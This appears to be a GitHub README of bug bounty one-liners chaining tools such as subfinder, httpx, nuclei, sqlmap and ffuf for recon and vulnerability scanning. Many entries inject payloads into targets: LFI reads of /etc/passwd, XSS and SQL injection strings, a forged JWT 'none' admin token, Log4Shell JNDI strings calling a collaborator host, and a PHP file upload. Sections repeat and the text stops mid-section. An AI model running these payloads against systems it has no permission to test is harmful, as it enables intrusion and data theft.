# OneLinerBounty

Welcome to **OneLinerBounty**! 🚀

This repository is a collection of **concise**, **actionable** bug bounty tips, each carefully crafted into a single line. Whether you're just getting started or you're a seasoned bug hunter, these tips will help you level up your skills, save time, and uncover more vulnerabilities. 💡

## Why OneLiners?

In the world of bug bounty hunting, time is precious. Short, impactful tips can make all the difference. Here, you'll find quick insights that can easily be referenced when you're diving into a new target, testing a feature, or looking to refine your methodology. 🔍

---

## 🌟 Let's Connect!

Hello, Hacker! 👋 We'd love to stay connected with you. Reach out to us on any of these platforms and let's build something amazing together:
 
📜 **Linktree:** [https://linktr.ee/yogsec](https://linktr.ee/yogsec)  
📷 **Instagram:** [https://www.instagram.com/yogsec.io/](https://www.instagram.com/yogsec.io/)  
🐦 **Twitter (X):** [https://x.com/yogsec](https://x.com/yogsec)  
👨‍💼 **Personal LinkedIn:** [https://www.linkedin.com/in/cybersecurity-pentester/](https://www.linkedin.com/in/cybersecurity-pentester/)  
📧 **Email:** abhinavsingwal@gmail.com

## ☕ Buy Me a Coffee

If you find our work helpful and would like to support us, consider buying us a coffee. Your support keeps us motivated and helps us create more awesome content. ❤️

☕ **Support Us Here:** [https://buymeacoffee.com/yogsec](https://buymeacoffee.com/yogsec)


---

# OneLinerBounty

## Quick Bug Bounty Tips

Here are some essential one-liners for various bug bounty tasks:

### Misconfigurations, Tech Detection, and Common Bugs
If you want wider coverage, like misconfigurations, tech detection, and common bugs, change the template path to `-t vulnerabilities/`:

```bash
cat urls.txt | httpx -silent -mc 200 | nuclei -silent -t vulnerabilities/ -o results.txt
```

### Subdomain Takeovers - Quick Check
Want to check for subdomain takeovers in one line?

```bash
subfinder -d example.com | httpx -silent | nuclei -silent -t takeovers/ -o takeover.txt
```

### Subdomain Discovery + Live Check
For subdomain discovery with live check:

```bash
subfinder -d target.com | httpx -silent -mc 200
```

### Subdomain Takeover Detection
Detect subdomain takeovers:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/
```

### Directory Bruteforce (Content Discovery)
For directory bruteforce:

```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200
```

### Find Open Redirects (Quick Scan)
To quickly find open redirects:

```bash
cat urls.txt | gf redirect | httpx -silent
```

### XSS Detection (Using Dalfox)
For XSS detection using Dalfox:

```bash
cat urls.txt | dalfox pipe --skip-bav --only-poc
```

### SQL Injection Discovery
For SQL Injection discovery:

```bash
cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -
```

### Subdomain Takeovers - Quick Check
Want to check for subdomain takeovers in one line?

```bash
subfinder -d example.com | httpx -silent | nuclei -silent -t takeovers/ -o takeover.txt
```

### Subdomain Discovery + Live Check
For subdomain discovery with live check:

```bash
subfinder -d target.com | httpx -silent -mc 200
```

### Subdomain Takeover Detection
Detect subdomain takeovers:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/
```

### Directory Bruteforce (Content Discovery)
For directory bruteforce:

```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200
```

### Find Open Redirects (Quick Scan)
To quickly find open redirects:

```bash
cat urls.txt | gf redirect | httpx -silent
```

### XSS Detection (Using Dalfox)
For XSS detection using Dalfox:

```bash
cat urls.txt | dalfox pipe --skip-bav --only-poc
```

### SQL Injection Discovery
For SQL Injection discovery:

```bash
cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -
```

### Find Sensitive Files (Backup, Config, etc.)
To find sensitive files like backups and configuration files:

```bash
cat urls.txt | waybackurls | grep -Ei '\.(bak|old|backup|log|env|sql|config)$'
```

### CORS Misconfiguration Detection
To detect CORS misconfigurations:

```bash
cat urls.txt | corscanner
```

### Detect Technologies + Possible CVEs
To detect technologies and possible CVEs:

```bash
cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/
```

### Parameter Discovery (for further testing)
To discover parameters for further testing:

```bash
cat urls.txt | waybackurls | uro | grep '?'
```

### Full Recon Chain (Subdomains + Live Check + Technologies + Titles)
For full recon chain:

```bash
subfinder -d target.com | httpx -silent -title -tech-detect
```

### Subdomain Enum + Ports Scan (Fast)
For a fast subdomain enumeration and port scan:

```bash
subfinder -d target.com | naabu -silent -top-ports 1000
```

### All URLs from Wayback, CommonCrawl, and AlienVault
To get all URLs from Wayback, CommonCrawl, and AlienVault:

```bash
gau target.com | tee urls.txt
```

### Find Secrets in JS Files
To find secrets in JS files:

```bash
cat urls.txt | grep '\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | tr "[:space:]" "\n" | grep -Ei "(api|key|token|secret|password|passwd|authorization)="'
```

### Find Open AWS Buckets
To find open AWS buckets:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t s3-detect.yaml
```

### Find Misconfigured Login Panels
To find misconfigured login panels:

```bash
cat urls.txt | nuclei -silent -t exposed-panels/
```

### Check All Parameters for Reflected XSS
To check all parameters for reflected XSS:

```bash
cat urls.txt | gf xss | dalfox pipe --skip-bav --only-poc
```

### Check for Exposed Git Repositories
To check for exposed Git repositories:

```bash
cat urls.txt | httpx -silent -path "/.git/config" -mc 200
```

### Extract All Parameters from URLs (for manual testing)
To extract all parameters from URLs for manual testing:

```bash
cat urls.txt | uro | grep '?'
```

### Takeover Domains from Subdomain List
To perform takeover checks on domains from a subdomain list:

```bash
cat subdomains.txt | nuclei -silent -t takeovers/
```

### Find CVEs Based on Technology
To find CVEs based on technology:

```bash
cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/
```

### Find Top Ports + Services for All Subdomains (Recon + Port Scan)
To find the top ports and services for all subdomains:

```bash
subfinder -d target.com | naabu -top-ports 1000 -silent
```

### Extract All Endpoints from JS Files (JS Analysis)
To extract all endpoints from JS files for analysis:

```bash
cat urls.txt | grep '\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | grep -oE "(/api/v[0-9]+/[^\"'\'']+|/[a-zA-Z0-9_/.-]+\.(php|aspx|jsp|html|json|xml|txt))"'
```

### Subdomain Discovery + Live Check
For subdomain discovery with live check:

```bash
subfinder -d target.com | httpx -silent -mc 200
```

### Subdomain Takeover Detection
Detect subdomain takeovers:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/
```

### Directory Bruteforce (Content Discovery)
For directory bruteforce:

```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200
```

### Find Open Redirects (Quick Scan)
To quickly find open redirects:

```bash
cat urls.txt | gf redirect | httpx -silent
```

### XSS Detection (Using Dalfox)
For XSS detection using Dalfox:

```bash
cat urls.txt | dalfox pipe --skip-bav --only-poc
```

### SQL Injection Discovery
For SQL Injection discovery:

```bash
cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -
```

### Find Sensitive Files (Backup, Config, etc.)
To find sensitive files like backups and configuration files:

```bash
cat urls.txt | waybackurls | grep -Ei '\.(bak|old|backup|log|env|sql|config)$'
```

### CORS Misconfiguration Detection
To detect CORS misconfigurations:

```bash
cat urls.txt | corscanner
```

### Detect Technologies + Possible CVEs
To detect technologies and possible CVEs:

```bash
cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/
```

### Parameter Discovery (for further testing)
To discover parameters for further testing:

```bash
cat urls.txt | waybackurls | uro | grep '?'
```

### Full Recon Chain (Subdomains + Live Check + Technologies + Titles)
For full recon chain:

```bash
subfinder -d target.com | httpx -silent -title -tech-detect
```

### Subdomain Enum + Ports Scan (Fast)
For a fast subdomain enumeration and port scan:

```bash
subfinder -d target.com | naabu -silent -top-ports 1000
```

### All URLs from Wayback, CommonCrawl, and AlienVault
To get all URLs from Wayback, CommonCrawl, and AlienVault:

```bash
gau target.com | tee urls.txt
```

### Find Secrets in JS Files
To find secrets in JS files:

```bash
cat urls.txt | grep '\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | tr "[:space:]" "\n" | grep -Ei "(api|key|token|secret|password|passwd|authorization)="'
```

### Find Open AWS Buckets
To find open AWS buckets:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t s3-detect.yaml
```

### Find Misconfigured Login Panels
To find misconfigured login panels:

```bash
cat urls.txt | nuclei -silent -t exposed-panels/
```

### Check All Parameters for Reflected XSS
To check all parameters for reflected XSS:

```bash
cat urls.txt | gf xss | dalfox pipe --skip-bav --only-poc
```

### Check for Exposed Git Repositories
To check for exposed Git repositories:

```bash
cat urls.txt | httpx -silent -path "/.git/config" -mc 200
```

### Extract All Parameters from URLs (for manual testing)
To extract all parameters from URLs for manual testing:

```bash
cat urls.txt | uro | grep '?'
```

### Takeover Domains from Subdomain List
To perform takeover checks on domains from a subdomain list:

```bash
cat subdomains.txt | nuclei -silent -t takeovers/
```

### Find CVEs Based on Technology
To find CVEs based on technology:

```bash
cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/
```

### Find Top Ports + Services for All Subdomains (Recon + Port Scan)
To find the top ports and services for all subdomains:

```bash
subfinder -d target.com | naabu -top-ports 1000 -silent
```

### Extract All Endpoints from JS Files (JS Analysis)
To extract all endpoints from JS files for analysis:

```bash
cat urls.txt | grep '\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | grep -oE "(/api/v[0-9]+/[^\"'\'']+|/[a-zA-Z0-9_/.-]+\.(php|aspx|jsp|html|json|xml|txt))"'
```

### Scan for Backup Files (Old Config/DB Dumps)
To scan for backup files, old config, or DB dumps:

```bash
cat urls.txt | httpx -silent -path-list <(echo -e "/.env\n/config.php\n/backup.zip\n/database.sql\n/admin.bak") -mc 200
```

### Find Open .git Folders (Source Leak)
To find open `.git` folders:

```bash
cat subdomains.txt | httpx -silent -path "/.git/config" -mc 200
```

### WordPress Scan (Detect Plugins, Themes, etc.)
For WordPress scan to detect plugins, themes, etc.:

```bash
cat urls.txt | nuclei -silent -t technologies/wordpress/
```

### Hunt for CRLF Injection (Newline Injection)
To hunt for CRLF injection:

```bash
cat urls.txt | gf crlf | qsreplace '%0d%0aTestHeader:TestValue' | httpx -silent -hdrs
```

### Detect CORS Misconfigurations (Very Common Bug)
To detect CORS misconfigurations:

```bash
cat urls.txt | corscanner
```

### Test All URLs for LFI (Local File Inclusion)
To test all URLs for LFI:

```bash
cat urls.txt | gf lfi | qsreplace '/etc/passwd' | httpx -silent -mc 200
```

### Find Information Disclosure via Backup Files
To find information disclosure via backup files:

```bash
cat urls.txt | waybackurls | grep -Ei '\.(bak|old|backup|log|sql|env|zip|tar|gz|rar)$' | httpx -silent -mc 200
```

### Find Exposed Panels (Admin, Login, etc.)
To find exposed admin/login panels:

```bash
cat urls.txt | nuclei -silent -t exposed-panels/
```

### Full JS Hunting + Secrets Scan (for frontend leaks)
For full JS hunting and secrets scan:

```bash
gau target.com | grep '\.js$' | httpx -silent | xargs -I{} bash -c 'echo {} && curl -s {} | tr -d "\r" | grep -E -i "(api[_-]?key|secret|token|auth|password|passwd|client[_-]?id|client[_-]?secret)="'
```

### Search for Open Redirects (URL Redirect issues)
To search for open redirects:

```bash
cat urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -mc 302,301 -fr 'evil.com'
```

### Quick Scan for SQL Injection
For a quick SQL injection scan:

```bash
cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -
```

### Find Interesting Endpoints (Like admin, login, debug, etc.)
To find interesting endpoints like admin, login, debug, etc.:

```bash
gau target.com | grep -Ei '/(admin|login|debug|test|backup|panel|dashboard)'
```

### Check for Exposed Config Files (like .env, .git, .DS_Store)
To check for exposed config files:

```bash
cat urls.txt | httpx -silent -path-list <(echo -e '/.env\n/.git/config\n/.DS_Store\n/config.php\n/config.json') -mc 200
```

### Scan for CVE in All Subdomains
To scan for CVEs in all subdomains:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t cves/
```

### Full Backup File Search (All extensions that leak data)
To search for all extensions that leak backup files:

```bash
gau target.com | grep -Ei '\.(bak|old|backup|sql|log|tar|zip|gz|rar|swp|env|config)$' | httpx -silent -mc 200
```

### Check for CORS Misconfigurations
To check for CORS misconfigurations:

```bash
cat urls.txt | corscanner
```

### Scan for Open Admin Panels (Exposed Panels)
```bash
cat urls.txt | nuclei -silent -t exposed-panels/
```

### ALL-IN-ONE MEGA SCAN 💣 (Subdomain + Alive + CVE Scan + Panels)
```bash
subfinder -d target.com | httpx -silent -mc 200 | tee alive.txt | nuclei -silent -t cves/,exposed-panels/
```

### All-in-One Recon Pipeline (Subdomains → Probing → Ports → Tech Detection → Titles)
```bash
subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | anew alive.txt
```

### Mass Fetch JS Files + Find Secrets + Endpoints + Tokens
```bash
cat alive.txt | hakrawler -subs | grep '\.js$' | anew jsfiles.txt && cat jsfiles.txt | xargs -I{} bash -c 'curl -s {} | tr -d "\r" | egrep -i "(api|key|token|secret|password|passwd|authorization|bearer|client_id|client_secret)"' | tee secrets.txt
```

### Check for Open Redirects Across All Params (with Payload Injection)
```bash
cat alive.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -mc 302,301
```

### Automatic Vulnerability Scan (Subdomains to CVE Detection + Misconfigs)
```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t cves/,misconfiguration/
```

### Backup Files Bruteforce Across All Hosts
```bash
cat alive.txt | httpx -silent -path-list <(echo -e "/.git/config\n/.env\n/database.sql\n/backup.zip\n/config.php\n/wp-config.php") -mc 200 | tee backups.txt
```

### Check for Parameter-Based XSS (Direct Injection Testing)
```bash
cat alive.txt | hakrawler -subs -depth 2 | gf xss | qsreplace '"><script>alert(document.domain)</script>' | httpx -silent -fr 'alert(document.domain)'
```

### Automated LFI Discovery (Common Payloads)
```bash
cat alive.txt | gf lfi | qsreplace '../../../../../../etc/passwd' | httpx -silent -mc 200
```

### Fuzz Parameters & Check Reflections (for XSS & Injection Discovery)
```bash
cat alive.txt | waybackurls | gf params | uro | qsreplace FUZZ | ffuf -u FUZZ -w wordlists/payloads/xss.txt -fr 'FUZZ'
```

### Subdomain Takeover Detection (Live Scan + Detection)
```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/
```

### Full Asset Discovery + Technology Analysis + Title Collection
```bash
assetfinder --subs-only target.com | httpx -silent -title -tech-detect | tee assets_with_tech.txt
```

### Mega Pipeline - Subdomains → URLs → Parameters → XSS/SQL/Secrets
```bash
subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent | hakrawler -subs -depth 2 | anew urls.txt && cat urls.txt | gf xss | dalfox pipe --skip-bav --only-poc | tee xss_poc.txt && cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | egrep -i "(api|key|token|secret|password|passwd|auth)"' | tee secrets.txt
```

### Ultimate Recon Monster (Subdomains → Probing → Ports → Technologies → CVEs)
```bash
subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee tech_scan.txt && cat tech_scan.txt | nuclei -silent -t cves/
```

### Automated Asset Hunting + JS Analysis + Secret Finder
```bash
subfinder -d target.com | httpx -silent -mc 200 | hakrawler -subs -depth 3 -plain | anew urls.txt && cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | tr -d "\r" | gf secrets | tee -a secrets.txt'
```

### Mass Fuzz Every Parameter with XSS, LFI, SQLi Payloads (Ultimate Param Attacker)
```bash
cat urls.txt | gf xss,lfi,sqli | uro | qsreplace FUZZ | ffuf -u FUZZ -w xss.txt,lfi.txt,sqli.txt -fr "FUZZ" | tee param_fuzz.txt
```

### Subdomain Takeover, DNS Hijack, Misconfig Scan - All In One
```bash
subfinder -d target.com | dnsx -a -resp-only -silent | nuclei -silent -t takeovers/,dns/
```

### Automatic Full Backup File Bruteforcing Across All Hosts (Super Leaks Finder)
```bash
subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | httpx -silent -path-list <(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/backup.txt) -mc 200 | tee backups_found.txt
```

### Deep Directory Brute Force (Smart Recursive Finder)
```bash
subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | xargs -I{} gobuster dir -u {} -w big_wordlist.txt -t 50 -o gobuster_output.txt
```

### Blind SSRF Auto-Detection in All Parameters
```bash
cat urls.txt | gf ssrf | qsreplace 'http://canarytoken.com' | httpx -silent -mc 200 -fr 'canarytoken'
```

### Mega Wordlist Generator from Wayback + JS + HTML Comments + Robots.txt + Sitemap.xml
```bash
subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | hakrawler -subs -depth 2 | anew urls.txt && cat urls.txt | gf wordlist | anew wordlist.txt
```

### Full Sitemap & Robots Extraction Across Subdomains
```bash
subfinder -d target.com | httpx -silent -path-list <(echo -e "/robots.txt\n/sitemap.xml") -mc 200 | tee robots_sitemaps.txt
```

### CRLF Injection Full Auto Discovery & Exploit
```bash
cat urls.txt | gf crlf | qsreplace '%0d%0aTest-Header: InjectedValue' | httpx -silent -hdrs | tee crlf_vulns.txt
```

### CSP Analyzer Across All Hosts (Misconfig Finder)
```bash
cat alive.txt | httpx -silent -path / -mc 200 -hdrs | grep -i 'content-security-policy' | tee csp_misconfig.txt
```

### Full JS Endpoint Extraction + Sensitive Function Search (eval, document.write, etc.)
```bash
cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | grep -E -o "(http|https)://[^\" ]+" | anew js_endpoints.txt && curl -s {} | egrep -i "(document\.write|eval|innerHTML|fetch|XMLHttpRequest|localStorage|sessionStorage|cookie)" | tee -a sensitive_js.txt'
```

### Recon + Full Vuln Scan + CORS, Headers, CVE, Misconfig, Secrets — One Command to Rule Them All
```bash
subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee alive.txt && cat alive.txt | nuclei -silent -t cves/,misconfiguration/,exposures/,default-logins/,panels/ | tee findings.txt && cat alive.txt | hakrawler -subs -depth 3 | anew urls.txt && cat urls.txt | gf xss,sqli,lfi,ssrf | dalfox pipe --skip-bav --only-poc | tee vulns.txt && cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | tr -d "\r" | gf secrets' | tee secrets_found.txt
```

### Subdomain Takeover + Open Redirect Chain (Full Passive → Exploit Ready)
```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/,redirect/ -o takeover_redirects.txt
```

### Full Parameter Discovery + Automated Fuzzing (XSS, SQLi, LFI, SSRF)
```bash
gau target.com | gf xss,lfi,sqli,ssrf | qsreplace FUZZ | ffuf -u FUZZ -w payloads/xss.txt,payloads/lfi.txt,payloads/sqli.txt,payloads/ssrf.txt -fr "FUZZ" | tee param_vulns.txt
```

### Auto Search for Backup Files + Leaked Configs (All Subdomains)
```bash
subfinder -d target.com | httpx -silent -path-list <(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/backup.txt) -mc 200 | tee backup_leaks.txt
```

### Deep Web Archive Scraping + JS Secrets Extraction
```bash
gau --subs target.com | grep '\.js$' | httpx -silent -status-code -mc 200 | xargs -I{} bash -c 'curl -s {} | gf secrets' | tee js_secrets.txt
```

### Auto-Dump All Endpoints from Wayback, JS, Robots.txt, Sitemap.xml
```bash
subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent -path-list <(echo -e "/robots.txt\n/sitemap.xml") -mc 200 | hakrawler -subs -depth 3 | anew all_urls.txt
```

### CSP Bypass Finder (Auto Fetch CSP Across All Subdomains)
```bash
subfinder -d target.com | httpx -silent -path / -mc 200 -hdrs | grep -i 'content-security-policy' | tee csp_policies.txt
```

### Automatic SSRF Detection (Using Collaborator/Canarytokens)
```bash
gau target.com | gf ssrf | qsreplace 'http://your-collaborator-url.burpcollaborator.net' | httpx -silent
```

### Deep Search for Hidden Panels + Config Pages (Across All Ports)
```bash
subfinder -d target.com | httpx -silent -ports 80,443,8080,8443 | nuclei -silent -t panels/,exposures/configs/ -o exposed_panels.txt
```

### Entire Subdomain + Tech Stack + CVE + Misconfig Scan (Full Recon Bomb)
```bash
subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | nuclei -silent -t cves/,misconfiguration/ -o full_scan.txt
```

### Auto-Scrape HTML Comments for Sensitive Info
```bash
cat all_urls.txt | httpx -silent -mc 200 -fr 'text/html' -body | grep -iE "<!--.*-->" | tee html_comments.txt
```

### URL Extraction from JS Files (Full Recursive)
```bash
cat all_urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | grep -Eo "(https?|ftp)://[a-zA-Z0-9./?=_-]*"' | anew extracted_urls.txt
```

### Super Bruteforce for Backup + Git + Env + SQL Dumps
```bash
subfinder -d target.com | httpx -silent -path-list <(echo -e "/.git/\n/.env\n/database.sql\n/backup.zip\n/config.yml") -mc 200 | tee sensitive_files.txt
```

### Advanced Open Redirect Scanner Across All Params
```bash
cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects.txt
```

### Full Headers Security Misconfig Audit
```bash
subfinder -d target.com | httpx -silent -path / -mc 200 -hdrs | nuclei -silent -t misconfiguration/http-headers/ -o header_issues.txt
```

### Auto-Gather All IPs, ASN, WHOIS for Every Subdomain
```bash
subfinder -d target.com | dnsx -a -resp-only | anew all_ips.txt && cat all_ips.txt | xargs -I{} sh -c 'whois {} | grep -iE "OrgName|NetName|CIDR"' | tee whois_lookup.txt
```

### Master Recon + Scan Pipeline (One-Liner)
```bash
subfinder -d target.com | tee subs.txt && cat subs.txt | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee tech_info.txt && cat subs.txt | hakrawler -subs -depth 3 | anew urls.txt && cat urls.txt | nuclei -silent -t cves/,misconfiguration/,takeovers/,panels/,redirect/ -o nuclei_findings.txt && cat urls.txt | gf xss,sqli,lfi,ssrf,redirect | qsreplace FUZZ | ffuf -u FUZZ -w payloads/xss.txt,payloads/sqli.txt,payloads/lfi.txt,payloads/ssrf.txt -fr "FUZZ" | tee param_scan.txt
```

### Additional Specific Recon + Vulnerability Scanning Commands

#### Directory Traversal (Across All Endpoints)
```bash
cat all_urls.txt | gf lfi | qsreplace '../../../../../etc/passwd' | httpx -silent -fr 'root:x' -o traversal_hits.txt
```

#### Exposed Git Repos Finder (Automated)
```bash
subfinder -d target.com | httpx -silent -path /.git/HEAD -mc 200 -o exposed_git.txt
```

#### IDOR Discovery (Bruteforce Parameter Tampering)
```bash
cat all_urls.txt | gf idor | qsreplace 'id=123' | anew idor_urls.txt && qsreplace 'id=124' | httpx -silent -mc 200 -o possible_idor.txt
```

#### JWT Token Misconfig (None Algorithm)
```bash
cat all_urls.txt | grep -Ei 'jwt|token' | qsreplace 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' | httpx -silent -mc 200 -o jwt_none.txt
```

#### Unrestricted File Upload (Testing Common Upload Points)
```bash
cat all_urls.txt | gf upload | qsreplace 'file=payload.php' | httpx -silent -upload-file payload.php -o upload_findings.txt
```

#### Path Confusion + Overlays (Detect Double Extensions)
```bash
cat all_urls.txt | sed 's/$/%00index.php/' | httpx -silent -mc 200 -o path_confusion.txt
```

#### CORS Wildcard + Credentials Misconfig
```bash
subfinder -d target.com | httpx -silent -path / -H 'Origin: https://evil.com' -hdrs | grep -i 'access-control-allow-origin' | grep 'evil.com' | tee weak_cors.txt
```

#### Log4Shell Finder (Old but Gold)
```bash
cat all_urls.txt | gf ssrf | qsreplace '${jndi:ldap://your-collaborator-url.burpcollaborator.net}' | httpx -silent
```

#### Server Side Template Injection (SSTI Detection)
```bash
cat all_urls.txt | gf ssti | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti_hits.txt
```

#### Prototype Pollution Detection (Direct & Indirect)
```bash
cat all_urls.txt | gf parameters | qsreplace '__proto__[exploit]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt
```

#### Exposed Debug Pages (Stack Traces, Debug Consoles)
```bash
subfinder -d target.com | httpx -silent -path-list <(echo -e '/debug\n/_profiler\n/_debugbar\n/_error') -mc 200 -o debug_pages.txt
```

#### Email Leaks in JS Files
```bash
cat all_urls.txt | grep '\.js$' | xargs -I{} curl -s {} | grep -Eo "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | tee emails_found.txt
```

### Cloud Misconfig - Public S3 Buckets
```bash
subfinder -d target.com | httpx -silent -path / -hdrs | grep -i 'x-amz-bucket-region' | tee public_s3.txt
```

### Exposed Admin Panels (Full Auto Discovery)
```bash
subfinder -d target.com | httpx -silent -path-list <(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/admin-panels.txt) -mc 200 -o exposed_admins.txt
```

### Mass Content Injection Check (Reflected Params)
```bash
cat all_urls.txt | gf xss | qsreplace '<script>alert(1)</script>' | httpx -silent -fr '<script>alert(1)</script>' -o reflected_xss.txt
```

### BONUS — Ultimate ALL Misconfig Scanner (Headers, Panels, Debug, Leaks)
```bash
subfinder -d target.com | httpx -silent -title -tech-detect | nuclei -silent -t misconfiguration/ -o misconfigs_found.txt
```

### API Key Leaks in JS Files
```bash
cat all_js_urls.txt | xargs -I{} curl -s {} | grep -Eo 'AIza[0-9A-Za-z_-]{35}|sk_live_[0-9a-zA-Z]{24}' | tee leaked_api_keys.txt
```

### Backup Files Discovery (Think: .bak, .old, .swp)
```bash
cat all_urls.txt | sed -E 's/(.*)/\1~\n\1.bak\n\1.old\n\1.swp/' | httpx -silent -mc 200 -o backup_files.txt
```

### PHP Unit RCE Finder (Real-World Gold)
```bash
subfinder -d target.com | httpx -silent -path /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -mc 200 -o phpunit_rce.txt
```

### GraphQL Misconfig Detection (Introspection Enabled)
```bash
cat all_urls.txt | grep 'graphql' | xargs -I{} curl -s -X POST -d '{"query":"{__schema{types{name}}}"}' {} | grep -iq 'types' && echo "{} introspection enabled" >> graphql_misconfigs.txt
```

### Host Header Injection
```bash
cat all_urls.txt | httpx -silent -H 'Host: evil.com' -hdrs | grep -i 'evil.com' | tee host_header_injection.txt
```

### Open Redirect Finder (Redirection Abuse)
```bash
cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'https://evil.com' -o open_redirects.txt
```

### Session Fixation Detection
```bash
cat all_urls.txt | gf login | qsreplace 'sessionid=1234abcd' | httpx -silent -fr '1234abcd' -o session_fixation.txt
```

### Exposed .env Files (Sensitive Config Exposure)
```bash
subfinder -d target.com | httpx -silent -path /.env -mc 200 -o exposed_env.txt
```

### SSRF Detection (Collaboration Automation)
```bash
cat all_urls.txt | gf ssrf | qsreplace 'http://your-collab-url.burpcollaborator.net' | httpx -silent
```

### CRLF Injection
```bash
cat all_urls.txt | gf crlf | qsreplace '%0D%0ASet-Cookie:crlf=found' | httpx -silent -fr 'crlf=found' -o crlf_injections.txt
```

### CMS Detection (for Known Exploits)
```bash
subfinder -d target.com | httpx -silent -tech-detect -o cms_detected.txt
```

### Missing Security Headers (Easy Win)
```bash
cat all_urls.txt | httpx -silent -H 'X-Content-Type-Options' -H 'X-Frame-Options' -H 'Content-Security-Policy' -H 'Strict-Transport-Security' | grep -E "missing|absent" | tee weak_headers.txt
```

### Cache Poisoning Detection
```bash
cat all_urls.txt | gf cache | qsreplace 'X-Forwarded-Host: evil.com' | httpx -silent -fr 'evil.com' -o cache_poisoning.txt
```

### Client-Side Prototype Pollution
```bash
cat all_js_urls.txt | xargs -I{} curl -s {} | grep -E 'prototype|__proto__|constructor' | tee client_side_prototype.txt
```

### Sensitive Image Exposures (Backups/Logs)
```bash
subfinder -d target.com | httpx -silent -path-list <(echo -e '/backup.jpg\n/screenshot.png\n/db-dump.png\n/log.png') -mc 200 -o exposed_images.txt
```

### BONUS — Full Recon Workflow One-Liner
```bash
subfinder -d target.com | httpx -silent -title -tech-detect | nuclei -silent -t vulnerabilities/ -o all_findings.txt
```

### Log4j Vulnerability Scanner (JNDI Injection)
```bash
cat all_urls.txt | qsreplace '${jndi:ldap://your-collab-url.burpcollaborator.net/a}' | httpx -silent -o log4j_candidates.txt
```

### AWS S3 Bucket Takeover (Misconfigured Buckets)
```bash
subfinder -d target.com | sed 's/$/.s3.amazonaws.com/' | httpx -silent -mc 200 -o open_buckets.txt
```

### JWT Secrets Brute Force (Weak Signing Key)
```bash
cat jwt_tokens.txt | jwt-cracker -w wordlist.txt -t 50 -o weak_jwt_keys.txt
```

### CORS Misconfiguration Finder
```bash
cat all_urls.txt | httpx -silent -H 'Origin: https://evil.com' -hdrs | grep -E "Access-Control-Allow-Origin: \*|Access-Control-Allow-Origin: https://evil.com" | tee cors_vulns.txt
```

### GCP Bucket Enumeration (Google Cloud)
```bash
subfinder -d target.com | sed 's/$/.storage.googleapis.com/' | httpx -silent -mc 200 -o open_gcp_buckets.txt
```

### Python Pickle Injection Check (Deserialization Bug)
```bash
cat all_urls.txt | gf deserialize | qsreplace 'evil_pickle_payload_here' | httpx -silent -o pickle_vulns.txt
```

### SQL Injection (Error-Based Detection)
```bash
cat all_urls.txt | gf sqli | qsreplace "' OR 1=1 --" | httpx -silent -fr 'syntax|sql|error|database' -o sql_injection.txt
```

### Version Disclosure Detection
```bash
cat all_urls.txt | httpx -silent -hdrs | grep -Ei 'server:|x-powered-by:' | tee version_disclosures.txt
```

### CRLF Injection with Cookie Injection Check
```bash
cat all_urls.txt | gf crlf | qsreplace '%0d%0aSet-Cookie:+crlf=found' | httpx -silent -fr 'crlf=found' -o crlf_cookie_injection.txt
```

### Directory Traversal Finder
```bash
